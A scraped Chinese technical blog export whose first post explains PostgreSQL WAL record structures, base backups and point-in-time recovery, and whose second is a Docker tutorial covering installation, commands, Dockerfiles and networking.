XLogRecordBlockHeader struct * ... * XLogRecordDataHeader[Short|Long] struct * block data * block data * ... * main data * * There can be zero or more XLogRecordBlockHeaders, and 0 or more bytes of * rmgr-specific data not associated with a block. XLogRecord structs * always start on MAXALIGN boundaries in the WAL files, but the rest of * the fields are not aligned. * * The XLogRecordBlockHeader, XLogRecordDataHeaderShort and * XLogRecordDataHeaderLong structs all begin with a single 'id' byte. It's * used to distinguish between block references, and the main data structs. */XLOG Record按存储的数据内容来划分，大体可以分为三类：Record for backup block：存储full-write-page的block，这种类型Record是为了解决page部分写的问题。在checkpoint完成后第一次修改数据page，在记录此变更写入事务日志文件时整页写入（需设置相应的初始化参数，默认为打开）；Record for tuple data block：存储page中的tuple变更，使用这种类型的Record记录；Record for Checkpoint：在checkpoint发生时，在事务日志文件中记录checkpoint信息(其中包括Redo point)。其中XLOG Record data是存储实际数据的地方，由以下几部分组成：0..N个XLogRecordBlockHeader，每一个XLogRecordBlockHeader对应一个block data；XLogRecordDataHeader[Short|Long]，如数据大小&lt;256 Bytes，则使用Short格式，否则使用Long格式；block data：full-write-page data和tuple data。对于full-write-page data，如启用了压缩，则数据压缩存储，压缩后该page相关的元数据存储在XLogRecordBlockCompressHeader中；main data： /checkpoint等日志数据. 固定Record Header结构: – 记录 prev wal 12345678910111213typedef struct XLogRecord ==&gt; 24byte&#123; uint32 xl_tot_len; /* total len of entire record */ 4byte TransactionId xl_xid; /* xact id */ 4byte XLogRecPtr xl_prev; /* ptr to previous record in log */ 8byte uint8 xl_info; /* flag bits, see below */ 1byte RmgrId xl_rmid; /* resource manager for this record */ 1byte /* 2 bytes of padding here, initialize to zero */ -- +2 byte pg_crc32c xl_crc; /* CRC for this record */ 4byte /* XLogRecordBlockHeaders and XLogRecordDataHeader follow, no padding */&#125; XLogRecord; 实际Record Block Data Header存放: 数据信息头. 1234567891011typedef struct XLogRecordBlockHeader&#123; uint8 id; /* block reference ID */ 1byte uint8 fork_flags; /* fork within the relation, and flags */ 1byte uint16 data_length; /* number of payload bytes (not including page 2byte * image) */ /* If BKPBLOCK_HAS_IMAGE, an XLogRecordBlockImageHeader struct follows */ /* If BKPBLOCK_SAME_REL is not set, a RelFileNode follows */ /* BlockNumber follows */&#125; XLogRecordBlockHeader; Record Data Header ==&gt; XLogRecordDataHeader[Short|Long]，如数据大小&lt;256 Bytes，则使用Short格式，否则使用Long格式； 123456789101112131415161718192021222324/* * XLogRecordDataHeaderShort/Long are used for the \"main data\" portion of * the record. If the length of the data is less than 256 bytes, the short * form is used, with a single byte to hold the length. Otherwise the long * form is used. * * (These structs are currently not used in the code, they are here just for * documentation purposes). */typedef struct XLogRecordDataHeaderShort&#123; uint8 id; /* XLR_BLOCK_ID_DATA_SHORT */ uint8 data_length; /* number of payload bytes */&#125; XLogRecordDataHeaderShort;#define SizeOfXLogRecordDataHeaderShort (sizeof(uint8) * 2)typedef struct XLogRecordDataHeaderLong&#123; uint8 id; /* XLR_BLOCK_ID_DATA_LONG */ /* followed by uint32 data_length, unaligned */&#125; XLogRecordDataHeaderLong;#define SizeOfXLogRecordDataHeaderLong (sizeof(uint8) + sizeof(uint32)) access/heapam_xlog.h 123456typedef struct xl_heap_header&#123; uint16 t_infomask2; //2byte uint16 t_infomask; //2byte uint8 t_hoff; //1byte&#125; xl_heap_header; SQL 标记操作: 12345678/* This is what we need to know about insert */typedef struct xl_heap_insert&#123; OffsetNumber offnum; /* inserted tuple's offset */ uint8 flags; /* xl_heap_header &amp; TUPLE DATA in backup block 0 */&#125; xl_heap_insert; 执行INSERT数据为例, 在插入数据时的XLOG Record Data内部结构如下图. [pg_waldump]PostgreSQL自带的wal解析; 连续归档在任何时候，Postgresql维护在数据库数据目录的子目录pg_wal/【下一个子预写日志】。 这个日志文件记录了任何对数据库数据文件的更改。文件的存在主要目的是用于崩溃安全(crash-safety). 如果数据库崩溃，数据库通过”重播”从最后检查点依赖产生的日志条目可以恢复一致。 日志的存在性使人们可能以第三策略来备份数据库, 结合文件系统级别备份和wal文件备份。恢复文件系统备份，然后从备份WAL文件重新运行， 把系统恢复到当前状态。 不需要一个从出发点完全一致的文件系统备份。备份中任何内部不一致的地方将会通过在日志重做被纠正。 结合无限长的持续的重做WAL文件, 连续备份可以简单的归档，只要继续归档WAL文件即可。 重做最终WAL条目一直到结束是没有必要的。 我们能够阻止任何点的重做, 并有一个一致的数据库快照 设置WAL归档.正在运行的PostgreSQL系统产生无限长序列的WAL记录. 该系统物理上划分这个序列到多个WAL段文件，通常每个段只有16MB(但是在创建PostgreSQL时, 段的大小可以改变)。 该段文件给出序列数字名称来映射它们在抽象WAL序列上的位置. 当不使用WAL归档，系统就通常只创建几个段文件，然后回收它们，通过重命名不在需要的段文件到更高的段编号。 其内容在最后检查点之前则是没有使用价值和可以循环使用。 pg_start_backuppg_start_backup 开始为制作基础备份进行准备工作. 恢复过程从重做点开始, 因此pg_start_backup必须执行检查点, 以便在制作基础备份的开始时刻显示创建一个重做点。此次检查点的位置必须保存在非pg_control的其它文件中, 因为在备份期间可能会执行多次常规检查点. 强制进入整页写入模式. 切换到当前的WAL段文件 执行检查点. 创建backup_label backup_label 文件如下:123456START WAL LOCATION: 0/2B000060 (file 00000002000000000000002B)CHECKPOINT LOCATION: 0/2B000098BACKUP METHOD: pg_start_backupBACKUP FROM: masterSTART TIME: 2019-07-30 15:19:55 CSTLABEL: test_pitr_1 检查点位置 —— 该命令所创建检查点的LSN位置。 WAL开始位置——这不是给PITR用的，而是为流复制准备的。它被命名为START WAL LOCATION，因为复制模式下的备用服务器在初始启动时只读取一次该值。 备份方法——这是用于进行此基本备份的方法，如pg_start_backup或pg_basebackup。 备份来源 —— 说明此备份是从主库还是备库拉取。 开始时间 —— 这是执行pg_start_backup时的时间戳。 备份标签 —— 这是pg_start_backup中指定的标签。 pg_stop_backup123456ligang=# select pg_stop_backup ();NOTICE: pg_stop_backup complete, all required WAL segments have been archived pg_stop_backup ---------------- 0/2F0001C8(1 row) pg_start_backup打开整页写入, 关闭整页写入. 写入一条备份结束的xlog记录。 切换WAL段文件 创建一个备份历史记录文件 – 00000002000000000000002B.00000060.backup 12345678START WAL LOCATION: 0/2B000060 (file 00000002000000000000002B)STOP WAL LOCATION: 0/2F0001C8 (file 00000002000000000000002F)CHECKPOINT LOCATION: 0/2B000098BACKUP METHOD: pg_start_backupBACKUP FROM: masterSTART TIME: 2019-07-30 15:19:55 CSTLABEL: test_pitr_1STOP TIME: 2019-07-30 15:37:29 CST 删除backup_label文件. 123rmgr: XLOG len (rec/tot): 106/ 106, tx: 0, lsn: 0/2E000060, prev 0/2E000028, desc: CHECKPOINT_ONLINE redo 0/2E000028; tli 2; prev tli 2; fpw true; xid 0:604; oid 24601; multi 1; offset 0; oldest xid 551 in DB 1; oldest multi 1 in DB 1; oldest/newest commit timestamp xid: 0/0; oldest running xid 604; onlinermgr: XLOG len (rec/tot): 34/ 34, tx: 0, lsn: 0/2E0000D0, prev 0/2E000060, desc: BACKUP_END 0/2E000028rmgr: XLOG len (rec/tot): 24/ 24, tx: 0, lsn: 0/2E0000F8, prev 0/2E0000D0, desc: SWITCH PITR 时间点恢复(Point In Time Recovery)PITR 时间点恢复(Point In Time Recovery)与 常规恢复过程区别: 从哪里读取WAL段文件 正常恢复模式 – 来自基础目录下pg_wal子目录 PITR模式 – 来自配置参数archive_command的归档目录 从哪里读取检查点设置. 正常恢复模式 – 来自pg_control文件 PITR模式 – 来自backup_label PITR恢复操作:1.进入解压得到的data目录，删除pg_xlog文件夹，创建pg_xlog/archive_status文件夹： rm -rf pg_xlog mkdir -p pg_xlog/archive_status 从/usr/local/postgres-9.3.5/share目录下，拷贝一份recovery.conf：cp /usr/local/postgres-9.3.5/share/recovery.conf.sample recovery.conf 修改recovery.confvi recovery.conf： 添加： restore_command = ‘cp /home/postgres/archive/%f %p’ PITR流程: Postgresql 使用内部函数read_backup_label从backup_label文件中读取CHECKPOINT LOCATION值。 PostgreSQL 从recover.conf中读取一些参数值。 restore_command 和 recovery_target_time. Postgresql 开始从重放点重放WAL数据, 重做点的位置可以简单的从CHECKPOINT LOCATION的值中获得，PostgreSQL执行restore_command配置的命令, 将归档命令从归档区域复制到临时区域, 并从中读取WAL数据, 复制到临时区域的日志文件会在使用后被删除. 当恢复完成后, 会在pg_wal子目录创建时间线历史文件, 如xxxx.history. 如果启用了日志归档功能, 则还会在归档目录中创建相同的命名文件. Redo Pointer 验证 1234#define BackupHistoryFilePath(path, tli, logSegNo, offset) \\ snprintf(path, MAXPGPATH, XLOGDIR \"/%08X%08X%08X.%08X.backup\", tli, \\ (uint32) ((logSegNo) / XLogSegmentsPerXLogId), \\ (uint32) ((logSegNo) % XLogSegmentsPerXLogId), offset) 阅读代码src/backend/access/transam/xlog.c 123static XLogRecord*ReadRecord(XLogReaderState *xlogreader, XLogRecPtr RecPtr, int emode, bool fetching_ckpt) src/backend/access/transam/xlogreader.c 12XLogRecord *XLogReadRecord(XLogReaderState *state, XLogRecPtr RecPtr, char **errormsg) 代码获取chpt_start_recptr src/backend/access/transam/xlog.c 12345678910111213141516171819202122232425262728293031323334353637383940414243ckpt_start_recptr = GetXLogReplayRecPtr(NULL);/* * Get latest redo apply position. * * Exported to allow WALReceiver to read the pointer directly. */XLogRecPtrGetXLogReplayRecPtr(TimeLineID *replayTLI)&#123; XLogRecPtr recptr; TimeLineID tli; SpinLockAcquire(&amp;XLogCtl-&gt;info_lck); recptr = XLogCtl-&gt;lastReplayedEndRecPtr; tli = XLogCtl-&gt;lastReplayedTLI; SpinLockRelease(&amp;XLogCtl-&gt;info_lck); if (replayTLI) *replayTLI = tli; return recptr;&#125;/* * GetInsertRecPtr -- Returns the current insert position. * * NOTE: The value *actually* returned is the position of the last full * xlog page. It lags behind the real insert position by at most 1 page. * For that, we don't need to scan through WAL insertion locks, and an * approximation is enough for the current usage of this function. */XLogRecPtrGetInsertRecPtr(void)&#123; XLogRecPtr recptr; SpinLockAcquire(&amp;XLogCtl-&gt;info_lck); recptr = XLogCtl-&gt;LogwrtRqst.Write; SpinLockRelease(&amp;XLogCtl-&gt;info_lck); return recptr;&#125; 未完成…. 补充lsn是全局唯一值, 用于wal记录中记录总偏移位置. [pg_waldump] pg_controldata –&gt; 使用 $(PGDATA)/global/pg_control 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051pg_control version number: 1002Catalog version number: 201707211Database system identifier: 6721851427625463280Database cluster state: in productionpg_control last modified: Tue 06 Aug 2019 08:56:48 AM CSTLatest checkpoint location: 0/170F548Prior checkpoint location: 0/170F270Latest checkpoint's REDO location: 0/170F548Latest checkpoint's REDO WAL file: 000000010000000000000001Latest checkpoint's TimeLineID: 1Latest checkpoint's PrevTimeLineID: 1Latest checkpoint's full_page_writes: onLatest checkpoint's NextXID: 0:558Latest checkpoint's NextOID: 13901Latest checkpoint's NextMultiXactId: 1Latest checkpoint's NextMultiOffset: 0Latest checkpoint's oldestXID: 551Latest checkpoint's oldestXID's DB: 1Latest checkpoint's oldestActiveXID: 0Latest checkpoint's oldestMultiXid: 1Latest checkpoint's oldestMulti's DB: 1Latest checkpoint's oldestCommitTsXid:0Latest checkpoint's newestCommitTsXid:0Time of latest checkpoint: Tue 06 Aug 2019 08:56:43 AM CSTFake LSN counter for unlogged rels: 0/1Minimum recovery ending location: 0/0Min recovery ending loc's timeline: 0Backup start location: 0/0Backup end location: 0/0End-of-backup record required: nowal_level setting: replicawal_log_hints setting: offmax_connections setting: 100max_worker_processes setting: 10max_prepared_xacts setting: 0max_locks_per_xact setting: 64track_commit_timestamp setting: offMaximum data alignment: 8Database block size: 8192Blocks per segment of large relation: 131072WAL block size: 8192Bytes per WAL segment: 16777216Maximum length of identifiers: 64Maximum columns in an index: 32Maximum size of a TOAST chunk: 1996Size of a large-object chunk: 2048Date/time type storage: 64-bit integersFloat4 argument passing: by valueFloat8 argument passing: by valueData page checksum version: 0Mock authentication nonce: 9d1637d4a6729f17d02cc91eac480e274342cd29ca69add6ca7b960e94c9c7b2","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"Docker","slug":"docker/Docker","date":"2019-04-18T11:05:09.000Z","updated":"2019-08-17T01:00:55.418Z","comments":true,"path":"2019/04/18/docker/Docker/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2019/04/18/docker/Docker/","excerpt":"Docker: 官网注册Centos 安装12$ curl -fsSL get.docker.com -o get-docker.sh$ sudo sh get-docker.sh --mirror Aliyun 启动Docker CE 12$ sudo systemctl enable docker$ sudo systemctl start docker 建立Docker用户组 12$ sudo groupadd docker$ sudo usermod -aG docker $USER","text":"Docker: 官网注册Centos 安装12$ curl -fsSL get.docker.com -o get-docker.sh$ sudo sh get-docker.sh --mirror Aliyun 启动Docker CE 12$ sudo systemctl enable docker$ sudo systemctl start docker 建立Docker用户组 12$ sudo groupadd docker$ sudo usermod -aG docker $USER Docker 基础使用1$ sudo docker login images 查看实例 1234$ sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEcentos latest 9f38484d220f 4 weeks ago 202MBvagabond1132/centos_7 latest 9f38484d220f 4 weeks ago 202MB ps 查看链接实例: 12345$ sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd5e50f6fa6a6 vagabond1132/centos_7 \"/bin/bash\" 2 hours ago Up 2 hours clever_hypatia1680f31b1e29 centos \"/bin/bash\" 3 hours ago Up 3 hours peaceful_khoranad9be61c00477 centos \"/bin/bash\" 3 hours ago Up 3 hours quizzical_elgamal run: 创建启动实例: 1sudo docker run -ti vagabond1132/centos_7 /bin/bash 创建实例后，才能使用exec, start, stop tag 标签 1sudo docker tag centos:latest vagabond1132/centos_base_7:latest sudo docker images 1234REPOSITORY TAG IMAGE ID CREATED SIZEvagabond1132/centos_base_7 latest 9f38484d220f 4 weeks ago 202MBcentos latest 9f38484d220f 4 weeks ago 202MBvagabond1132/centos_7 latest 9f38484d220f 4 weeks ago 202MB push 上传 1sudo docker push centos vagabond1132/centos_base:latest Run 常用选项 选项 说明 -d 后台运行容器, 并返回容器ID；不指定时, 启动后开始打印日志, Ctrl + C 退出命令同时会关闭容器 -i 以交互模式运行容器, 通常与 -t 同时使用； -t 为容器重新分配一个伪输入终端, 通常与 -i 同时使用 –name “anyesu-container” 为容器指定一个别名, 不指定时随机生成 -h docker-anyesu 设置容器的主机名, 默认随机生成 –dns 8.8.8.8 指定容器使用的DNS服务器, 默认和宿主一致 -e docker_host=172.17.0.1 设置环境变量 –cpuset=”0-2” or –cpuset=”0,1,2” 绑定容器到指定CPU运行 -m 100M 设置容器使用内存最大值 –net bridge 指定容器的网络连接类型, 支持 bridge / host / none / container 四种类型 –ip 172.18.0.13 为容器分配固定ip(需要使用自定义网络) –expose 8081 –expose 8082 开放一个端口或一组端口, 会覆盖镜像设置中开放的端口 -p [宿主机端口]:[容器内端口] 宿主机到容器的端口映射, 可指定宿主机的要监听的ip, 默认为 0.0.0.0 -P 注意是大写的, 宿主机随机指定一组可用的端口映射容器 expose 的所有端口 -v [宿主机目录路径]:[容器内目录路径] 挂载宿主机的指定目录(或文件)到容器内的指定目录(或文件) –add-host [主机名]:[ip] 为容器hosts文件追加host, 默认会在hosts文件最后追加 [主机名]:[容器ip] –volumes-from [其他容器名] 将其他容器的数据卷添加到此容器 –link [其他容器名]:[在该容器中的别名] 添加链接到另一个容器, 在本容器hosts文件中加入关联容器的记录, 效果类似于 --add-host 基础命令 选项 说明 attach 进入运行中的容器, 显示该容器的控制台界面。注意, 从该指令退出会导致容器关闭 build 根据 Dockerfile 文件构建镜像 commit 提交容器所做的改为为一个新的镜像 cp 在容器和宿主机之间复制文件 create 根据镜像生成一个新的容器 diff 展示容器相对于构建它的镜像内容所做的改变 events 实时打印服务端执行的事件 exec 在已运行的容器中执行命令 export 导出容器到本地快照文件 history 显示镜像每层的变更内容 images 列出本地所有镜像 import 导入本地容器快照文件为镜像 info 显示 Docker 详细的系统信息 inspect 查看容器或镜像的配置信息, 默认为json数据 kill -s 选项向容器发送信号, 默认为SIGKILL信号(强制关闭) load 导入镜像压缩包 login 登录第三方仓库 logout 退出第三方仓库 logs 打印容器的控制台输出内容 pause 暂停容器 port 容器端口映射列表 ps 列出正在运行的容器, -a 选项显示所有容器 pull 从镜像仓库拉取镜像 push 将镜像推送到镜像仓库 rename 重命名容器名 restart 重启容器 rm 删除已停止的容器, -f 选项可强制删除正在运行的容器 rmi 删除镜像(必须先删除该镜像构建的所有容器) run 根据镜像生成并进入一个新的容器 save 打包本地镜像, 使用压缩包来完成迁移 search 查找镜像 start 启动关闭的容器 stats 显示容器对资源的使用情况(内存、CPU、磁盘等) stop 关闭正在运行的容器 tag 修改镜像tag top 显示容器中正在运行的进程(相当于容器内执行 ps -ef 命令) unpause 恢复暂停的容器 update 更新容器的硬件资源限制(内存、CPU等) version 显示docker客户端和服务端版本信息 wait 阻塞当前命令直到对应的容器被关闭, 容器关闭后打印结束代码 daemon 这个子命令已过期, 将在Docker 17.12之后的版本中移出, 直接使用dockerd 管理命令 选项 说明 container 管理容器 image 管理镜像 network 管理容器网络(默认为bridge、host、none三个网络配置) plugin 管理插件 system 管理系统资源。其中, docker system prune 命令用于清理没有使用的镜像, 容器, 数据卷以及网络 volume 管理数据卷 swarm 管理Swarm模式 service 管理Swarm模式下的服务 node 管理Swarm模式下的docker集群中的节点 secret 管理Swarm模式下的敏感数据 stack Swarm模式下利用compose-file管理服务 Dockerfiles 编写Dockerfile 是文本文件, 其中包含了一条条指令, 每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。 所谓定制镜像: 一定是以某一个镜像为基础, 在其上进行定制. 例如在某一个容器上进行修改. 那么原始镜像必须要手动指定， FROM 是基础原始镜像 因此一个Dockerfile 中 From是必备的指令，并且必须是第一条指令。 https://github.com/docker-library/postgres/blob/7e80419825e4bab4e749bc61334570ffc261ea5e/11/Dockerfile 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174# vim:set ft=dockerfile:FROM debian:stretch-slimRUN set -ex; \\ if ! command -v gpg &gt; /dev/null; then \\ apt-get update; \\ apt-get install -y --no-install-recommends \\ gnupg \\ dirmngr \\ ; \\ rm -rf /var/lib/apt/lists/*; \\ fi# explicitly set user/group IDsRUN set -eux; \\ groupadd -r postgres --gid=999; \\# https://salsa.debian.org/postgresql/postgresql-common/blob/997d842ee744687d99a2b2d95c1083a2615c79e8/debian/postgresql-common.postinst#L32-35 useradd -r -g postgres --uid=999 --home-dir=/var/lib/postgresql --shell=/bin/bash postgres; \\# also create the postgres user's home directory with appropriate permissions# see https://github.com/docker-library/postgres/issues/274 mkdir -p /var/lib/postgresql; \\ chown -R postgres:postgres /var/lib/postgresql# grab gosu for easy step-down from rootENV GOSU_VERSION 1.11RUN set -x \\ &amp;&amp; apt-get update &amp;&amp; apt-get install -y --no-install-recommends ca-certificates wget &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; wget -O /usr/local/bin/gosu \"https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$(dpkg --print-architecture)\" \\ &amp;&amp; wget -O /usr/local/bin/gosu.asc \"https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$(dpkg --print-architecture).asc\" \\ &amp;&amp; export GNUPGHOME=\"$(mktemp -d)\" \\ &amp;&amp; gpg --batch --keyserver ha.pool.sks-keyservers.net --recv-keys B42F6819007F00F88E364FD4036A9C25BF357DD4 \\ &amp;&amp; gpg --batch --verify /usr/local/bin/gosu.asc /usr/local/bin/gosu \\ &amp;&amp; &#123; command -v gpgconf &gt; /dev/null &amp;&amp; gpgconf --kill all || :; &#125; \\ &amp;&amp; rm -rf \"$GNUPGHOME\" /usr/local/bin/gosu.asc \\ &amp;&amp; chmod +x /usr/local/bin/gosu \\ &amp;&amp; gosu nobody true \\ &amp;&amp; apt-get purge -y --auto-remove ca-certificates wget# make the \"en_US.UTF-8\" locale so postgres will be utf-8 enabled by defaultRUN set -eux; \\ if [ -f /etc/dpkg/dpkg.cfg.d/docker ]; then \\ grep -q '/usr/share/locale' /etc/dpkg/dpkg.cfg.d/docker; \\ sed -ri '/\\/usr\\/share\\/locale/d' /etc/dpkg/dpkg.cfg.d/docker; \\ ! grep -q '/usr/share/locale' /etc/dpkg/dpkg.cfg.d/docker; \\ fi; \\ apt-get update; apt-get install -y locales; rm -rf /var/lib/apt/lists/*; \\ localedef -i en_US -c -f UTF-8 -A /usr/share/locale/locale.alias en_US.UTF-8ENV LANG en_US.utf8# install \"nss_wrapper\" in case we need to fake \"/etc/passwd\" and \"/etc/group\" (especially for OpenShift)# https://github.com/docker-library/postgres/issues/359# https://cwrap.org/nss_wrapper.htmlRUN set -eux; \\ apt-get update; \\ apt-get install -y --no-install-recommends libnss-wrapper; \\ rm -rf /var/lib/apt/lists/*RUN mkdir /docker-entrypoint-initdb.dRUN set -ex; \\# pub 4096R/ACCC4CF8 2011-10-13 [expires: 2019-07-02]# Key fingerprint = B97B 0AFC AA1A 47F0 44F2 44A0 7FCC 7D46 ACCC 4CF8# uid PostgreSQL Debian Repository key='B97B0AFCAA1A47F044F244A07FCC7D46ACCC4CF8'; \\ export GNUPGHOME=\"$(mktemp -d)\"; \\ gpg --batch --keyserver ha.pool.sks-keyservers.net --recv-keys \"$key\"; \\ gpg --batch --export \"$key\" &gt; /etc/apt/trusted.gpg.d/postgres.gpg; \\ command -v gpgconf &gt; /dev/null &amp;&amp; gpgconf --kill all; \\ rm -rf \"$GNUPGHOME\"; \\ apt-key listENV PG_MAJOR 11ENV PG_VERSION 11.2-1.pgdg90+1RUN set -ex; \\ \\# see note below about \"*.pyc\" files export PYTHONDONTWRITEBYTECODE=1; \\ \\ dpkgArch=\"$(dpkg --print-architecture)\"; \\ case \"$dpkgArch\" in \\ amd64|i386|ppc64el) \\# arches officialy built by upstream echo \"deb http://apt.postgresql.org/pub/repos/apt/ stretch-pgdg main $PG_MAJOR\" &gt; /etc/apt/sources.list.d/pgdg.list; \\ apt-get update; \\ ;; \\ *) \\# we're on an architecture upstream doesn't officially build for# let's build binaries from their published source packages echo \"deb-src http://apt.postgresql.org/pub/repos/apt/ stretch-pgdg main $PG_MAJOR\" &gt; /etc/apt/sources.list.d/pgdg.list; \\ \\ case \"$PG_MAJOR\" in \\ 9.* | 10 ) ;; \\ *) \\# https://github.com/docker-library/postgres/issues/484 (clang-6.0 required, only available in stretch-backports)# TODO remove this once we hit buster+ echo 'deb http://deb.debian.org/debian stretch-backports main' &gt;&gt; /etc/apt/sources.list.d/pgdg.list; \\ ;; \\ esac; \\ \\ tempDir=\"$(mktemp -d)\"; \\ cd \"$tempDir\"; \\ \\ savedAptMark=\"$(apt-mark showmanual)\"; \\ \\# build .deb files from upstream's source packages (which are verified by apt-get) apt-get update; \\ apt-get build-dep -y \\ postgresql-common pgdg-keyring \\ \"postgresql-$PG_MAJOR=$PG_VERSION\" \\ ; \\ DEB_BUILD_OPTIONS=\"nocheck parallel=$(nproc)\" \\ apt-get source --compile \\ postgresql-common pgdg-keyring \\ \"postgresql-$PG_MAJOR=$PG_VERSION\" \\ ; \\# we don't remove APT lists here because they get re-downloaded and removed later \\# reset apt-mark's \"manual\" list so that \"purge --auto-remove\" will remove all build dependencies# (which is done after we install the built packages so we don't have to redownload any overlapping dependencies) apt-mark showmanual | xargs apt-mark auto &gt; /dev/null; \\ apt-mark manual $savedAptMark; \\ \\# create a temporary local APT repo to install from (so that dependency resolution can be handled by APT, as it should be) ls -lAFh; \\ dpkg-scanpackages . &gt; Packages; \\ grep '^Package: ' Packages; \\ echo \"deb [ trusted=yes ] file://$tempDir ./\" &gt; /etc/apt/sources.list.d/temp.list; \\# work around the following APT issue by using \"Acquire::GzipIndexes=false\" (overriding \"/etc/apt/apt.conf.d/docker-gzip-indexes\")# Could not open file /var/lib/apt/lists/partial/_tmp_tmp.ODWljpQfkE_._Packages - open (13: Permission denied)# ...# E: Failed to fetch store:/var/lib/apt/lists/partial/_tmp_tmp.ODWljpQfkE_._Packages Could not open file /var/lib/apt/lists/partial/_tmp_tmp.ODWljpQfkE_._Packages - open (13: Permission denied) apt-get -o Acquire::GzipIndexes=false update; \\ ;; \\ esac; \\ \\ apt-get install -y postgresql-common; \\ sed -ri 's/#(create_main_cluster) .*$/\\1 = false/' /etc/postgresql-common/createcluster.conf; \\ apt-get install -y \\ \"postgresql-$PG_MAJOR=$PG_VERSION\" \\ ; \\ \\ rm -rf /var/lib/apt/lists/*; \\ \\ if [ -n \"$tempDir\" ]; then \\# if we have leftovers from building, let's purge them (including extra, unnecessary build deps) apt-get purge -y --auto-remove; \\ rm -rf \"$tempDir\" /etc/apt/sources.list.d/temp.list; \\ fi; \\ \\# some of the steps above generate a lot of \"*.pyc\" files (and setting \"PYTHONDONTWRITEBYTECODE\" beforehand doesn't propagate properly for some reason), so we clean them up manually (as long as they aren't owned by a package) find /usr -name '*.pyc' -type f -exec bash -c 'for pyc; do dpkg -S \"$pyc\" &amp;&gt; /dev/null || rm -vf \"$pyc\"; done' -- '&#123;&#125;' +# make the sample config easier to munge (and \"correct by default\")RUN set -eux; \\ dpkg-divert --add --rename --divert \"/usr/share/postgresql/postgresql.conf.sample.dpkg\" \"/usr/share/postgresql/$PG_MAJOR/postgresql.conf.sample\"; \\ cp -v /usr/share/postgresql/postgresql.conf.sample.dpkg /usr/share/postgresql/postgresql.conf.sample; \\ ln -sv ../postgresql.conf.sample \"/usr/share/postgresql/$PG_MAJOR/\"; \\ sed -ri \"s!^#?(listen_addresses)\\s*=\\s*\\S+.*!\\1 = '*'!\" /usr/share/postgresql/postgresql.conf.sample; \\ grep -F \"listen_addresses = '*'\" /usr/share/postgresql/postgresql.conf.sampleRUN mkdir -p /var/run/postgresql &amp;&amp; chown -R postgres:postgres /var/run/postgresql &amp;&amp; chmod 2777 /var/run/postgresqlENV PATH $PATH:/usr/lib/postgresql/$PG_MAJOR/binENV PGDATA /var/lib/postgresql/dataRUN mkdir -p \"$PGDATA\" &amp;&amp; chown -R postgres:postgres \"$PGDATA\" &amp;&amp; chmod 777 \"$PGDATA\" # this 777 will be replaced by 700 at runtime (allows semi-arbitrary \"--user\" values)VOLUME /var/lib/postgresql/dataCOPY docker-entrypoint.sh /usr/local/bin/RUN ln -s usr/local/bin/docker-entrypoint.sh / # backwards compatENTRYPOINT [\"docker-entrypoint.sh\"]EXPOSE 5432CMD [\"postgres\"] Run 执行命令Run 指令是用来执行命令行命令. shell 格式: run \\&lt;命令> 1run echo 'hello,world' &gt; /usr/local/index.txt exec 格式: run [“可执行文件”, “参数1”, “参数二”] 1run apt-get update 1234567891011121314FROM debian:stretchRUN buildDeps='gcc libc6-dev make wget' \\ &amp;&amp; apt-get update \\ &amp;&amp; apt-get install -y $buildDeps \\ &amp;&amp; wget -O redis.tar.gz \"http://download.redis.io/releases/redis-5.0.3.tar.gz\" \\ &amp;&amp; mkdir -p /usr/src/redis \\ &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \\ &amp;&amp; make -C /usr/src/redis \\ &amp;&amp; make -C /usr/src/redis install \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; rm redis.tar.gz \\ &amp;&amp; rm -r /usr/src/redis \\ &amp;&amp; apt-get purge -y --auto-remove $buildDeps 首先，之前所有的命令只有一个目的，就是编译、安装 redis 可执行文件。因此没有必要建立很多层，这只是一层的事情。因此，这里没有使用很多个 RUN 对一一对应不同的命令，而是仅仅使用一个 RUN 指令，并使用 &amp;&amp; 将各个所需命令串联起来。将之前的 7 层，简化为了 1 层。在撰写 Dockerfile 的时候，要经常提醒自己，这并不是在写 Shell 脚本，而是在定义每一层该如何构建。 1sudo docker build -t vagabond1132/image_name &lt;上下文路径/URL/&gt; Docker 默认储存位置修改Centos 7 Docker默认的存储地址位于 /var/lib/docker 当我们磁盘较小, 需要更改其默认存储; 12345678910111213141516vim /usr/lib/systemd/system/docker.service #修改内容ExecStart=/usr/bin/dockerd --graph /new-path/docker#拷贝到新的镜像地址:sudo cp -rf /var/lib/docker/* /new-path/docker#重新生成配置服务-reload 配置文件systemctl reload daemon-reload#重启Dockersystemctl restart docker###详细可以查看日志: 排查信息sudo tailf /var/log/messages Docker –privileged 启动1docker run -d --name rep9 --privileged=true mips-neokylin-hgdb-v4-rep3:latest /usr/sbin/init 改一下镜像和name Docker 创建固定IPbridge:桥接网络默认情况下启动的Docker容器，都是使用 bridge，Docker安装时创建的桥接网络，每次Docker容器重启时，会按照顺序获取对应的IP地址，这个就导致重启下，Docker的IP地址就变了 none:无指定网络使用 --network=none ，docker 容器就不会分配局域网的IP host:主机网络使用 --network=host，此时，Docker 容器的网络会附属在主机上，两者是互通的。 例如，在容器中运行一个Web服务，监听8080端口，则主机的8080端口就会自动映射到容器中。 1234567891011121314151617181920212223docker network create --subnet=172.18.0.0/16 mynetworkdocker run -itd --name test --network mynetwork --ip 172.18.0.100 mips-neokylin-repmgr:latest /bin/bashdocker exec -ti test /bin/bash[root@node2 ~]# docker exec -ti test /bin/bash[root@fc2872f990ee /]# [root@fc2872f990ee /]# [root@fc2872f990ee /]# ip a1: lo: 